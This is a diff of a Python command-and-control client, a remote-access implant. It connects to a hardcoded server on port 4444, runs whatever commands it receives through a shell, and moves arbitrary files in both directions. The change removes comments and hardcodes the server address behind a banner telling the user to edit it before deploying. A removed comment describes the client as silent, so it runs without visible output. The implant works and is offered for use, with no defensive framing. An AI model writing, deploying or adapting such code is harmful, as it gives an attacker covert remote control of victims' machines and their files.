@@ -3,7 +3,13 @@ import os
 import subprocess
 import struct
 import sys
-import threading
+
+# ==========================================
+# ✏️ EDIT THESE TWO LINES BEFORE DEPLOYING
+# ==========================================
+SERVER_HOST = "192.168.1.100"   # Change this to your server's IP
+SERVER_PORT = 4444              # Change this if your server uses a different port
+# ==========================================
 
 class C2Client:
     def __init__(self, host, port):
@@ -17,25 +23,20 @@ class C2Client:
     def run(self):
         while True:
             try:
-                # Wait for commands from server
                 data = self.client.recv(4096).decode().strip()
                 if not data:
                     break
 
-                # --- Command router ---
                 if data.lower() == "ping":
                     self.client.send(b"PONG")
 
                 elif data.upper().startswith("UPLOAD "):
-                    # Format: UPLOAD <remote_path>
                     _, remote_path = data.split(" ", 1)
-                    self.client.send(b"READY")  # Tell server we're ready
-                    # Receive size header
+                    self.client.send(b"READY")
                     size_data = self.client.recv(8)
                     if len(size_data) < 8:
                         continue
                     file_size = struct.unpack('!Q', size_data)[0]
-                    # Write file
                     with open(remote_path, 'wb') as f:
                         received = 0
                         while received < file_size:
@@ -46,7 +47,6 @@ class C2Client:
                             received += len(chunk)
 
                 elif data.upper().startswith("DOWNLOAD "):
-                    # Format: DOWNLOAD <remote_file>
                     _, remote_file = data.split(" ", 1)
                     if not os.path.exists(remote_file) or not os.path.isfile(remote_file):
                         self.client.send(struct.pack('!Q', 0))
@@ -67,7 +67,6 @@ class C2Client:
                     break
 
                 else:
-                    # Default: execute as shell command
                     try:
                         output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                         self.client.send(output)
@@ -75,10 +74,9 @@ class C2Client:
                         self.client.send(str(e).encode())
 
             except socket.timeout:
-                # Send a small heartbeat ping to check if server is still there
+                # Heartbeat: check if server is still alive
                 try:
                     self.client.send(b"PING")
-                    # Wait for PONG, if none, disconnect
                     resp = self.client.recv(4)
                     if resp != b"PONG":
                         break
@@ -90,8 +88,6 @@ class C2Client:
         self.client.close()
 
 if __name__ == "__main__":
-    # Silent: no prints, no prompts.
-    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
-    client = C2Client(host, port)
+    # No command-line arguments – just uses the hardcoded values above
+    client = C2Client(SERVER_HOST, SERVER_PORT)
     client.run()
